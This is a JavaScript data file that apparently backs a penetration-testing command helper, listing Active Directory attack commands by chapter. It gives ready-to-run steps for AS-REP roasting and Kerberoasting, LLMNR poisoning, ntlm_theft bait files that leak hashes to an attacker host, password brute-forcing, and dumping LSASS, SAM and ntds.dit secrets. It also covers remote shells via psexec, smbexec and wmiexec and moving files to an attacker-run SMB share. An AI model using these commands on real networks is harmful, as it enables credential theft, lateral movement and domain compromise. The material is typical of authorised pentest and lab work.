usefullCommandList["adds"] = [
    {
        chapter: "1. AD tools | enumeration - unauthenticated",
        chapter_commands: [
            {
                "title": "Utilizing 'GetNPUsers.py'",
                "explanation": "Use 'GetNPUsers.py' for an AS-REP roast attack.",
                "language": bash,
                "command": "GetNPUsers.py # AS-REP roast",
                "command_variation": `# 1. Retrieve all - AS-REP roast - able accounts from the domain in hashcat format (domain users samaccount names in users.txt)
GetNPUsers.py '{{DOMAIN}}'.'{{ROOTDNS}}'/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast`
            },
            {
                "title": "Utilizing 'responder' (MITM attacks)",
                "explanation": "Use 'responder' for an LLMNR poisoning attack.",
                "language": bash,
                "command": "responder # MITM attacks",
                "command_variation": `# 1. LLMNR POISONING ATTACK
# 1A. set the correct configuration, make sure that the following poisoners & servers are enabled in the '/etc/responder/Responder.conf' file
; Poisoners to start
MDNS  = On
LLMNR = On
NBTNS = On

; Servers to start
SQL      = On
SMB      = Off
RDP      = On
Kerberos = On
FTP      = On
POP      = On
SMTP     = On
IMAP     = On
HTTP     = Off
HTTPS    = On
DNS      = On
LDAP     = On
DCERPC   = On
WINRM    = On
SNMP     = Off
MQTT     = On

# 1B. setup responder to capture the hashes (make sure SMB signing is disabled OR enabled but not required)
responder -I {{NIC}} -Pv

# 1C. generate traffic, by navigating to a share that does not exist from 1 of the workstations, hashes should be captured

# OPTION 1: SMB SERVER 
# (Using powershell perspective)
//{{LHOST}}/superFakeShare

# OPTION 2: HTTP SERVER 
# (note that this can be used in combination with 'dnstool.py' to add a DNS record to the domain - see 'intelligence.htb' for exploitation steps)
# it does not work without '-UseDefaultCredentials'
powershell -c Invoke-WebRequest -Uri http://{{LHOST}} -UseDefaultCredentials

# OPTION 3: LDAP SERVER
# see return.htb - initial compromise as user 'svc-printer'`
            },
            {
                "title": "Utilizing 'ntlm_theft' (MITM attacks)",
                "explanation": "Use 'ntlm_theft' with 'smbserver.py' for capturing NTLM hashes.",
                "language": bash,
                "command": "ntlm_theft",
                "command_variation": `# requirements: write permissions to a share (check with 'smbclient' or 'nxc smb')
                
# 1. clone the ntlm_theft repository
git clone https://github.com/Greenwolf/ntlm_theft

# 2. navigate to the ntlm_theft folder and install the requirements
cd ntlm_theft
python3 -m venv venv
source venv/bin/activate
pip3 install xlsxwriter

# 3. run the ntlm_theft script to generate (all) the files that can callback your host
python3 ntlm_theft.py -g all -s {{LHOST}} -f test

# 4. upload the generated files to a share that you have write permissions to
smbclient //{{RHOST}}/ShareName -U {{USERNAME}}%'{{PASSWORD}}'
recurse ON
prompt OFF
lcd /local/source/directory
cd remote/target/directory
mput *

# 5. setup the smbserver.py to serve the share
smbserver.py sharename /path/to/empty/folder -smb2support

# 6. wait for a user to access the share and have 1 of the many files callback your host
C.BUM::flight.htb:aaaaa....

# 7. copy the hash to a file & crack it with hashcat/ john the ripper
...
`
            },
            {
                "title": "Utilizing 'kerbrute'",
                "explanation": "Use 'kerbrute' for brute-forcing valid usernames via Kerberos pre-authentication.",
                "language": bash,
                "command": "kerbrute # user enumeration",
                "command_variation": `# 1. brute-force valid usernames via Kerberos pre-authentication
kerbrute userenum --domain '{{DOMAIN}}'.'{{ROOTDNS}}' --dc {{RHOST}} /usr/share/wordlists/seclists/Usernames/Names/names.txt`
            },
            {
                "title": "Utilizing 'ridenum.py'",
                "explanation": "Use 'ridenum.py' for an attempt to enumerate user accounts",
                "language": bash,
                "command": "ridenum.py",
                "command_variation": `# 1. Enumerate user accounts from a domain
ridenum.py {{RHOST}} 500 50000

# 2. With guest account
ridenum.py {{RHOST}} 500 5000 Guest ''

# 3. With a specific user account
ridenum.py {{RHOST}} 50 5000 {{USERNAME}} '{{PASSWORD}}'
`
            },
            {
                "title": "Utilizing 'ADUserGen'",
                "explanation": "Use 'ADUserGen' to generate usernames based on given last and first names",
                "language": bash,
                "command": "ADUserGen",
                "command_variation": `# 1. navigate to https://github.com/0xKirito/ADUserGen - see the repository and clone it
git clone https://github.com/0xKirito/ADUserGen

# 2. prepare your userlist, e.g. a list of usernames per line as follows:
# first_name last_name
# first_name_2 last_name_2

# 3. run the ADUserGen script to generate usernames
python3 ADUserGen/AD_usernames_generator.py -u users.txt -o possible_users.txt
python3 ADUserGen/AD_usernames_generator.py -u users.txt -o possible_users.txt -a A -p A -an 0 -pn 2005`
            },
            {
                "title": "Utilizing 'ldapsearch'",
                "explanation": "Use 'ldapsearch' to search the LDAP directory for AD objects.",
                "language": bash,
                "command": "ldapsearch",
                "command_variation": `# 1. get the base namingcontext of the host
ldapsearch -H ldap://{{RHOST}} -x -s base namingContexts

# 2. retrieve all information based on the base namingcontext
ldapsearch -H ldap://{{RHOST}} -x -b "DC={{DOMAIN}},DC={{ROOTDNS}}"

# 3. authenticated
ldapsearch -U '{{USERNAME}}'@'{{DOMAIN}}'.'{{ROOTDNS}}' -w '{{PASSWORD}}' -H ldap://{{RHOST}} -x -b "DC={{DOMAIN}},DC={{ROOTDNS}}"

# 3A. with ldapsearch deepen on a specific user (authenticated) - get all the domain info
ldapsearch -x -H ldap://{{RHOST}} -D '{{USERNAME}}@{{DOMAIN}}.{{ROOTDNS}}' -w '{{PASSWORD}}' -b "DC={{DOMAIN}},DC={{ROOTDNS}}" -s sub "(objectClass=*)" "*" "+"

# 3B. with ldapsearch get all attribute info from domain users
ldapsearch -x -H ldap://{{RHOST}} -D '{{USERNAME}}@{{DOMAIN}}.{{ROOTDNS}}' -w '{{PASSWORD}}' -b "DC={{DOMAIN}},DC={{ROOTDNS}}" -s sub "(objectCategory=person)" "*" "+"

# 3C. with ldapsearch get all the groups info
ldapsearch -x -H ldap://{{RHOST}} -D '{{USERNAME}}@{{DOMAIN}}.{{ROOTDNS}}' -w '{{PASSWORD}}' -b "DC={{DOMAIN}},DC={{ROOTDNS}}" -s sub "(objectCategory=group)" "*" "+"
`
            },
            {
                "title": "Utilizing 'linWinPwn'",
                "explanation": "Use 'linWinPwn' to automate AD-enumeration.",
                "language": bash,
                "command": "linWinPwn",
                "command_variation": `# 1. clone the linWinPwn repository and install required dependencies
git clone https://github.com/lefayjey/linWinPwn
cd linWinPwn
chmod +x install.sh
./install.sh

# 2. run linWinPwn to enumerate the domain (AUTOMATICALLY) - unauthenticated
linWinPwn -t {{RHOST}} --auto -o unauthenticated_output_{{RHOST}}.txt

# 3. run linWinPwn to enumerate the domain (AUTOMATICALLY) - authenticated (Can also be a hash/ kerberos ticket)
linWinPwn -t {{RHOST}} -d {{DOMAIN}}.{{ROOTDNS}} -u {{USERNAME}} -p {{PASSWORD}} --auto -o authenticated_output_{{USERNAME}}_{{RHOST}}.txt
`
            },
        ]
    },
    {
        chapter: "2. AD tools | enumeration - authenticated",
        chapter_commands: [
            {
                "title": "Utilizing 'bloodhound-python'",
                "explanation": "Use 'bloodhound-python' to collect data for BloodHound analysis.",
                "language": bash,
                "command": "bloodhound-python",
                "command_variation": `# 1. Collect all data from a domain for BloodHound ingestion 
bloodhound-python -v -u {{USERNAME}} -p '{{PASSWORD}}' -d {{DOMAIN}}.{{ROOTDNS}} -dc {{HOSTNAME}}.{{DOMAIN}}.{{ROOTDNS}} -ns {{NAMESERVER}} -c All

##### INCASE you get an LDAP authentication error
# REFERENCE:
https://0xdf.gitlab.io/2025/04/05/htb-ghost.html#problem

# REFERENCE FOR FIX:
https://blog.ar-lacroix.fr/posts/2025-7-dnschef-fix-bloodhound-connectivity-issues-over-proxies/#how-can-i-use-it-to-stop-ldap-timeouts-

# 1. update your /etc/resolv.conf to use the nameserver '127.0.0.1' (make sure to create a .bk file and restore after)
\`\`\`
nameserver 127.0.0.1
search localdomain
\`\`\`

# 2. create a 'dnschef.ini' file for dnschef.py with the following content:
\`\`\`
[A] # Queries for IPv4 address records
{{HOSTNAME}}.{{DOMAIN}}.{{ROOTDNS}}={{RHOST}} # domain controller
\`\`\`

# 3. run dnschef.py with the config file
dnschef.py --file dnschef.ini

# 4. run bloodhound-python again to collect all data from the domain
...`
            },
            {
                "title": "Utilizing 'SharpHound.ps1'",
                "explanation": "Use 'SharpHound.ps1' to collect data for BloodHound analysis.",
                "language": bash,
                "command": "SharpHound.ps1",
                "command_variation": `# 1. Collect all data from a domain for BloodHound ingestion 
powershell -ep bypass
Import-Module ./SharpHound.ps1
Get-Help Invoke-BloodHound

# 1A. collect all data
Invoke-BloodHound -CollectionMethods All

# 1B. with a loop (gather additional data every minute for 10 minutes as the environment changes)
Invoke-BloodHound -Loop -LoopInterval 00:01:00 -LoopDuration 00:10:00
`
            },
            {
                "title": "Utilizing 'ldapdomaindump'",
                "explanation": "Use 'ldapdomaindump' to collect all data for a domain",
                "language": bash,
                "command": "ldapdomaindump",
                "command_variation": `# 1. Collect all data from a domain using ldapdomaindump
# 1A. Make sure you have the domain, in this case domain.local, saved in your /etc/hosts folder
sudo vim /etc/hosts

# 1B. Use ldapdomaindump to collect data from the domain
ldapdomaindump -u '{{DOMAIN}}'.'{{ROOTDNS}}'\\\\'{{USERNAME}}' -p '{{PASSWORD}}' '{{DOMAIN}}'.'{{ROOTDNS}}'`
            },
            {
                title: "Utilizing 'GetUserSPNs.py'",
                explanation: "Finds service accounts with SPNs, grabs TGS tickets for cracking (Kerberoasting). Requires valid domain creds.",
                language: bash,
                command: `GetUserSPNs.py # Kerberoast`,
                command_variation: `# 1. retrieve all - KERBEROAST - able accounts from the domain
GetUserSPNs.py '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}' -dc-ip {{RHOST}} -request -outputfile hashes.kerberoast`
            },
            {
                title: "Utilizing 'targetedKerberoast.py'",
                explanation: "Finds service accounts with SPNs, grabs TGS tickets for cracking (Kerberoasting). Requires valid domain and certain privileges over the AD object",
                language: bash,
                command: `targetedKerberoast.py # Kerberoast`,
                command_variation: `# 1 retrieve all - KERBEROAST - able accounts from the domain
targetedKerberoast.py -v -d '{{DOMAIN}}.{{ROOTDNS}}' -u '{{USERNAME}}' -p '{{PASSWORD}}'`
            },
            {
                title: "Utilizing 'certipy'",
                explanation: "Use 'certipy' to enumerate and request certificates from Active Directory Certificate Services (AD CS).",
                language: bash,
                command: `certipy`,
                command_variation: `# 1. Enumerate all available certificate templates in the domain
certipy find -u '{{USERNAME}}@{{DOMAIN}}.{{ROOTDNS}}' -p '{{PASSWORD}}' -dc-ip {{RHOST}} -vulnerable -enabled

# 2. in case you get an SSL error
certipy find -u '{{USERNAME}}@{{DOMAIN}}.{{ROOTDNS}}' -p '{{PASSWORD}}' -dc-ip {{RHOST}} -vulnerable -enabled -ldap-scheme ldap -ldap-port 389 -no-ldap-signing -no-ldap-channel-binding -ldap-simple-auth`
            },

        ]
    },
    {
        chapter: "3. AD tools | post-exploitation - authenticated",
        chapter_commands: [
            {
                "title": "Utilizing 'nxc smb'",
                "explanation": "Use 'nxc smb' to execute commands on an remote host",
                "language": bash,
                "command": `nxc smb # prep + shares`,
                "command_variation": `# 1. generate a record for the /etc/hosts and /etc/krb5.conf file
nxc smb {{RHOST}} --generate-hosts-file /etc/hosts
nxc smb {{RHOST}} --generate-krb5-file /etc/krb5.conf

# 2A. connect to a remote host and list all available shares (tip: use --local-auth flag for local accounts)
nxc smb {{RHOST}} -u '{{USERNAME}}' -d '{{DOMAIN}}'.'{{ROOTDNS}}' -p '{{PASSWORD}}' --shares
nxc smb {{RHOST}} -u '{{USERNAME}}' -d '{{DOMAIN}}'.'{{ROOTDNS}}' -H '{{HASH}}' --shares

# 2B. connect to a host and list all available shares and list all content of the shares with the module spider_plus
nxc smb {{RHOST}} -u '{{USERNAME}}' -d '{{DOMAIN}}'.'{{ROOTDNS}}' -p '{{PASSWORD}}' -M spider_plus -o OUTPUT_FOLDER=./
nxc smb {{RHOST}} -u '{{USERNAME}}' -d '{{DOMAIN}}'.'{{ROOTDNS}}' -H '{{HASH}}' -M spider_plus -o OUTPUT_FOLDER=./

# 2C. add the download flag to download all files
nxc smb {{RHOST}} -u '{{USERNAME}}' -d '{{DOMAIN}}'.'{{ROOTDNS}}' -p '{{PASSWORD}}' -M spider_plus -o DOWNLOAD_FLAG=True
nxc smb {{RHOST}} -u '{{USERNAME}}' -d '{{DOMAIN}}'.'{{ROOTDNS}}' -H '{{HASH}}' -M spider_plus -o DOWNLOAD_FLAG=True

# 3. bruteforce SMB credentials with a userlist and passwordlist
nxc smb {{RHOST}} -u users.txt -p passwords.txt --continue-on-success --local-auth
nxc smb {{RHOST}} -u users.txt -h hashes.txt --continue-on-success 

# 4. Try authenticating on multiple hosts using a 'target' file that contains the ip addresses
nxc smb target targets.txt -u '{{USERNAME}}' -d '{{DOMAIN}}'.'{{ROOTDNS}}' -p '{{PASSWORD}}'
`
            },
            {
                "title": "Utilizing 'nxc smb' - useful modules",
                "explanation": "Use 'nxc smb'",
                "language": bash,
                "command": `nxc smb # exploitation modules`,
                "command_variation": `# 1. check for all vulnerabilities nxc supports
nxc smb {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -M nopac -M ntlm_reflection -M zerologon -M printnightmare -M smbghost -M ms17-010 -M coerce_plus

# 2. LSASSY module (dumps plaintext passwords from LSASS memory)
nxc smb {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN}}'.'{{ROOTDNS}}' -M lsassy
nxc smb {{RHOST}} -u '{{USERNAME}}' -H '{{HASH}}' -d '{{DOMAIN}}'.'{{ROOTDNS}}' -M lsassy

# 3. dump the SAM database
nxc smb {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN}}'.'{{ROOTDNS}}' --sam
nxc smb {{RHOST}} -u '{{USERNAME}}' -H '{{HASH}}' -d '{{DOMAIN}}'.'{{ROOTDNS}}' --sam

# 4. dump the ntds.dit database
nxc smb {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --ntds
nxc smb {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --ntds --enabled
nxc smb {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --ntds vss

# 5. enable RDP through smb (or disable)
nxc smb {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -M rdp -o ACTION=enable

# view all modules for the protocol
nxc smb -L
`
            },
            {
                "title": "Utilizing 'nxc ldap' - useful modules",
                "explanation": "Use 'nxc ldap'",
                "language": bash,
                "command": `nxc ldap # Modules`,
                "command_variation": `# 1. bloodhound ingestor (bloodhound-ce)
nxc ldap {{HOSTNAME}}.{{DOMAIN}}.{{ROOTDNS}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --bloodhound --collection All --dns-server {{NAMESERVER}}

# 2. generate users export, get pass pol, get domain SID
nxc ldap {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --users-export users.txt --pass-pol --get-sid

# 3. as-rep roast & kerberoasting
nxc ldap {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --asreproast asreproast.txt
nxc ldap {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --kerberoast kerberoast.txt

# view all modules for the protocol
nxc ldap -L 
`
            },
            {
                "title": "Utilizing 'nxcdb'",
                "explanation": "Use 'nxcdb'",
                "language": bash,
                "command": `nxcdb # nxc database`,
                "command_variation": `
# 1. startup the nxcdb (database) to retrieve previous results (hashes/ shares/ credentials etc)
nxcdb > use default
nxcdb (default) > proto smb
nxcdb (default)(smb) > help

Documented commands (type help <topic>):
========================================
clear_database  creds  dpapi  exit  export  groups  help  hosts  shares  wcc

# shows everything that is in the database and retrieved by nxc
`
            },
            {
                "title": "Utilizing 'nxc ssh'",
                "explanation": "Use 'nxc ssh' to brute-force SSH credentials and execute commands on a remote host.",
                "language": bash,
                "command": `nxc ssh`,
                "command_variation": `# 1. bruteforce SSH credentials with a userlist and passwordlist
nxc ssh {{RHOST}} -u users.txt -p passwords.txt
                
# 2. bruteforce SSH credentials with a userlist and passwordlist on a specific port + timeout
nxc ssh {{RHOST}} -u users.txt -p passwords.txt --timeout 3 2> /dev/null
`
            },
            {
                "title": "Utilizing 'nxc ftp'",
                "explanation": "Use 'nxc ftp' to brute-force ftp credentials.",
                "language": bash,
                "command": `nxc ftp`,
                "command_variation": `# 1. bruteforce ftp credentials with a userlist and passwordlist
nxc ftp {{RHOST}} -u users.txt -p passwords.txt
                
# 2. bruteforce FTP credentials with a userlist and passwordlist, then list files in the root directory
nxc ftp {{RHOST}} -u users.txt -p passwords.txt --ls
`
            },
            {
                "title": "Utilizing 'nxc rdp'",
                "explanation": "Use 'nxc rdp' to brute-force rdp credentials and execute commands on the remote host.",
                "language": bash,
                "command": `nxc rdp`,
                "command_variation": `# 1. bruteforce rdp credentials with a userlist and passwordlist
nxc rdp {{RHOST}} -u users.txt -p passwords.txt

# 2. create a screenshot of the remote host
nxc rdp {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' --screenshot
                
# 3. execute commands on the remote host
nxc rdp {{RHOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -x 'whoami'
`
            },
            {
                "title": "Utilizing 'evil-winrm'",
                "explanation": "Use 'evil-winrm' to authenticate to a Windows host via WinRM.",
                "language": bash,
                "command": "evil-winrm",
                "command_variation": `# 1. Connect to a Windows host using WinRM
evil-winrm -i {{RHOST}} -u {{USERNAME}} -p '{{PASSWORD}}'

# 2. Connect to a Windows host using WinRM with a hash
evil-winrm -i {{RHOST}} -u {{USERNAME}} -H {{HASH}}

# 3. Connect to a Windows host using WinRM with a Kerberos ticket (krb5ccache variable + /etc/krb5.conf file must be set - checkout nxc smb modules)
evil-winrm -i {{HOSTNAME}}.{{DOMAIN}}.{{ROOTDNS}} -r {{DOMAIN}}.{{ROOTDNS}}

# 3. Certificate based authentication
# in case you have a .pfx certificate file, you can extract the public and private keys using openssl
# extract private key
openssl pkcs12 -in cert.pfx -nocerts -out priv.pem -nodes

# extract public key
openssl pkcs12 -in cert.pfx -clcerts -nokeys -out pub.pem

# connect to the host using the public and private keys (-S for SSL/TLS connection)
evil-winrm -i {{RHOST}} -c pub.pem -k priv.pem -S -r {{DOMAIN}}
`
            },
            {
                title: "Utilizing 'powershell'",
                explanation: "Execute commands via powershell to retrieve AD domain details",
                language: bash,
                command: `powershell`,
                command_variation: `# 1. get basic information about the domain/ machine
# 1A. get the domain details
Get-ADDomain

# 1B. get the domain SID
(Get-ADDomain).DomainSID

# 1C. get the current machine account
(Get-WmiObject Win32_ComputerSystem).Name + "@" + (Get-WmiObject Win32_ComputerSystem).Domain

# 1D. get the current users domain
whoami /fqdn

# 2. execute a zone transfer and print to stdout
# 2A. display all DNS zones
Get-DnsServerZone

# 2B. execute a zone transfer
Get-DnsServerResourceRecord -ZoneName {{DOMAIN}}.{{ROOTDNS}}`
            },
            {
                title: "Utilizing 'pylaps'",
                explanation: "Read out the LAPS password from a Windows host",
                language: bash,
                command: `pylaps`,
                command_variation: `# 1. clone the pylaps repository to your /opt folder
git clone https://github.com/p0dalirius/pyLAPS

# 2. navigate to the pylaps folder, create a venv, install requirements
cd /opt/pyLAPS
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# 3. run the pylaps script to read out the LAPS password
python3 pyLAPS.py --action get -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN}}.{{ROOTDNS}}' --dc-ip {{RHOST}}`
            },
            {
                title: "Utilizing 'bloody-ad'",
                explanation: "Use 'bloody-ad' to perform various post-exploitation tasks in an Active Directory environment.",
                language: bash,
                command: `bloody-ad`,
                command_variation: `# 1. read the Local administrator password
bloodyAD --host "{{RHOST}}" -d "{{DOMAIN}}.{{ROOTDNS}}" -u "{{USERNAME}}" -p "{{PASSWORD}}" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

# 2. read the gMSA passwords
bloodyAD --host "{{RHOST}}" -d "{{DOMAIN}}.{{ROOTDNS}}" -u "{{USERNAME}}" -p "{{PASSWORD}}" get object 'svc_apache$' --attr msDS-ManagedPassword
`
            },
            {
                title: "Utilizing 'dnstool.py'",
                explanation: "Utilize dnstool.py to add or query DNS records to a domain",
                language: bash,
                command: `dnstool.py`,
                command_variation: `# 1. add a DNS record to the domain
dnstool.py -u '{{DOMAIN}}\\{{USERNAME}}' -p '{{PASSWORD}}' --record 'A_RECORD_NAME' --action add -t A --data {{LHOST}} {{RHOST}}

# 2. query a DNS record you just made
dnstool.py -u '{{DOMAIN}}\{{USERNAME}}' -p '{{PASSWORD}}' --record 'A_RECORD_NAME' --action query -t A --data {{LHOST}} {{RHOST}}

# 3. make the record inactive
dnstool.py -u '{{DOMAIN}}\\{{USERNAME}}' -p '{{PASSWORD}}' --record 'A_RECORD_NAME' --action remove -t A --data {{LHOST}} {{RHOST}}
`
            },
            {
                title: "Utilizing 'gosecretsdump'",
                explanation: "Utilize gosecretsdump to dump Windows secrets",
                language: bash,
                command: `gosecretsdump`,
                command_variation: `# 1. Dump the content of the Active Directory database (ntds.dit) and SYSTEM registry hive file
gosecretsdump -ntds ntds.dit -system SYSTEM                
`
            },

        ]
    },
    {
        chapter: "4. Impacket-suite - tools collection",
        chapter_commands: [
            {
                title: "Utilizing 'psexec.py'",
                explanation: "Execute commands via service (creates and deletes a service on the target) / shell commands.",
                language: bash,
                command: `psexec.py`,
                command_variation: `# 1 Basic Command Execution
# Connect to a remote host using administrator credentials and get an interactive shell (through SMB).
psexec.py '{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}}
psexec.py -hashes '{{HASH}}' '{{USERNAME}}'@{{RHOST}}

# 2. Connect to a remote domain host
psexec.py '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}}
psexec.py -hashes '{{HASH}}' '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}'@{{RHOST}}

# 3. psexec with kerberos authentication (try multiple options from 3C if the first does not work)
# 3A. export the kRB5CCNAME environment variable to the location of your Kerberos ticket cache file
export KRB5CCNAME=$(pwd)/administrator@cifs_{{HOSTNAME}}.{{DOMAIN}}.{{ROOTDNS}}@{{DOMAIN}}.{{ROOTDNS}}.ccache

# 3B. write the machine name in your /etc/hosts
echo "{{RHOST}} {{HOSTNAME}}.{{DOMAIN}}.{{ROOTDNS}}" >> /etc/hosts

# 3C. execute the 'psexec.py' command with kerberos authentication
# OPTION 1
psexec.py -k '{{HOSTNAME}}'.'{{DOMAIN}}'.'{{ROOTDNS}}'

# OPTION 2
psexec.py -k -no-pass '{{HOSTNAME}}'.'{{DOMAIN}}'.'{{ROOTDNS}}'

# OPTION 3
psexec.py '{{DOMAIN}}'.'{{ROOTDNS}}'/administrator@'{{HOSTNAME}}'.'{{DOMAIN}}'.'{{ROOTDNS}}' -k -no-pass -dc-ip {{RHOST}}
`
            },
            {
                title: "Utilizing 'smbexec.py'",
                explanation: "Execute commands via SMB pipes (stealthier than psexec but still noisy) / shell commands.",
                language: bash,
                command: `smbexec.py`,
                command_variation: `# 1. Basic Command Execution
# Connect to a remote host using SMB pipes and execute commands in an interactive shell.
smbexec.py '{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}}
smbexec.py -hashes '{{HASH}}' '{{USERNAME}}'@{{RHOST}}

# 2. Connect to a remote domain host
smbexec.py '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}}
smbexec.py -hashes '{{HASH}}' '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}'@{{RHOST}}

# 3. Specifying a Custom Share
# Specify a custom share (e.g., C$ or ADMIN$) for SMB interaction.
smbexec.py '{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}} -share ADMIN$

# 4. Connect to a remote host using an administrator hash
smbexec.py -hashes '{{HASH}}' '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}'@{{RHOST}}

# 5. smbexec with kerberos authentication (try multiple options from 4C if the first does not work)
# 5A. export the kRB5CCNAME environment variable to the location of your Kerberos ticket cache file
export KRB5CCNAME=$(pwd)/administrator@cifs_{{HOSTNAME}}.{{DOMAIN}}.{{ROOTDNS}}@{{DOMAIN}}.{{ROOTDNS}}.ccache

# 5B. write the machine name in your /etc/hosts
echo "{{RHOST}} {{HOSTNAME}}.{{DOMAIN}}.{{ROOTDNS}}" >> /etc/hosts

# 5C. execute the 'smbexec.py' command with kerberos authentication
# OPTION 1
smbexec.py -k '{{HOSTNAME}}'.'{{DOMAIN}}'.'{{ROOTDNS}}'

# OPTION 2
smbexec.py -k -no-pass '{{HOSTNAME}}'.'{{DOMAIN}}'.'{{ROOTDNS}}'

# OPTION 3
smbexec.py '{{DOMAIN}}'.'{{ROOTDNS}}'/administrator@'{{HOSTNAME}}'.'{{DOMAIN}}'.'{{ROOTDNS}}' -k -no-pass -dc-ip {{RHOST}}
`
            },
            {
                title: "Utilizing 'wmiexec.py'",
                explanation: "wmiexec.py uses the Windows Management Instrumentation (WMI) to execute commands on a remote Windows host.",
                language: bash,
                command: `wmiexec.py`,
                command_variation: `# 1. Basic Command Execution
# Connect to a remote host using: Windows Management Instrumentation (WMI)
wmiexec.py '{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}}
wmiexec.py -hashes '{{HASH}}' '{{USERNAME}}'@{{RHOST}}

# 2. within a domain
wmiexec.py '{{HASH}}' '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}}
wmiexec.py -hashes '{{HASH}}' '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}'@{{RHOST}}
`
            },
            {
                title: "Utilizing 'atexec.py'",
                explanation: "atexec.py uses the Windows Task Scheduler service to execute commands on a remote Windows host.",
                language: bash,
                command: `atexec.py`,
                command_variation: `# 1. Basic Command Execution
# Execute a command through the Windows Task Scheduler service on a remote host.
atexec.py '{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}} 'whoami'
atexec.py -hashes '{{HASH}}' '{{USERNAME}}'@{{RHOST}} 'whoami'

# 2. within a domain
atexec.py '{{HASH}}' '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}} 'whoami'
atexec.py -hashes '{{HASH}}' '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}'@{{RHOST}} 'whoami'
`
            },
            {
                title: "Utilizing 'secretsdump.py'",
                explanation: "secretsdump.py extracts Windows password hashes, LSA secrets, and other credentials for pass-the-hash or password cracking attacks.",
                language: bash,
                command: `secretsdump.py`,
                command_variation: `# 1A. Parse the locally saved SAM and SYSTEM registry hive files, to extract user passwords (e.g. : SeBackupPrivilege)
secretsdump.py -sam sam.hive -system system.hive LOCAL

# 1B. Parse the locally saved NTDS.dit and SYSTEM registry files
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# 2A. Dumps domain password hashes and other credentials using Administrator credentials via secretsdump.              
secretsdump.py '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'@'{{DOMAIN}}'.'{{ROOTDNS}}'
secretsdump.py -hashes '{{HASH}}' '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}'@'{{DOMAIN}}'.'{{ROOTDNS}}'

# 2B. Dumps domain password hashes from a workstation.              
secretsdump.py '{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}}
secretsdump.py -hashes '{{HASH}}' '{{USERNAME}}'@{{RHOST}}

# 3. Dump local password hashes from an workstation that has joined the domain
secretsdump.py -ntds C:\\Windows\\NTDS\\ntds.dit -system C:\\Windows\\System32\\Config\\system -dc-ip {{RHOST}} '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}}

# 4. secretsdump with kerberos authentication (try multiple options from 4C if the first does not work)
# 4A. export the KRB5CCNAME environment variable to the location of your Kerberos ticket cache file
export KRB5CCNAME=$(pwd)/administrator@cifs_{{HOSTNAME}}.{{DOMAIN}}.{{ROOTDNS}}@{{DOMAIN}}.{{ROOTDNS}}.ccache

# 4B. write the machine name in your /etc/hosts
echo "{{RHOST}} {{HOSTNAME}}.{{DOMAIN}}.{{ROOTDNS}}" >> /etc/hosts

# 4C. execute the 'secretsdump.py' command with kerberos authentication
# OPTION 1
secretsdump.py -k '{{HOSTNAME}}'.'{{DOMAIN}}'.'{{ROOTDNS}}'

# OPTION 2
secretsdump.py -k -no-pass '{{HOSTNAME}}'.'{{DOMAIN}}'.'{{ROOTDNS}}'

# OPTION 3
secretsdump.py '{{DOMAIN}}'.'{{ROOTDNS}}'/administrator@'{{HOSTNAME}}'.'{{DOMAIN}}'.'{{ROOTDNS}}' -k -no-pass -dc-ip {{RHOST}}`
            },
            {
                title: "Utilizing 'smbserver.py'",
                explanation: "Serve an SMB server in order to quickly upload and download files",
                language: bash,
                command: `smbserver.py`,
                command_variation: `# 1. setup smbserver.py share
# shareName = any name you want to give it
# sharePath = folder you want to share
smbserver.py shareName sharePath -username root -password 123456 -smb2support

## LINUX ##
# connect to the smbserver from linux, connect instantly
smbclient //{{LHOST}}/shareName -U root%'123456'

put filename
get filename

## WINDOWS ##
# Connect to SMB share from windows cmd, connect instantly - OPTION 1
net use X: \\\\{{LHOST}}\\sharename 123456 /user:WORKGROUP\\root

# Connect to smb share from Windows PS, connect instantly - OPTION 2
$remoteCredential = [System.Management.Automation.PSCredential]::new('WORKGROUP\\root', (ConvertTo-SecureString '123456' -AsPlainText -Force))
$psDrive = New-PSDrive -Name X -PSProvider FileSystem -Root '\\\\{{LHOST}}\\shareName' -Credential $remoteCredential

cd X:

# copy files from the windows machine to the smb filesystem
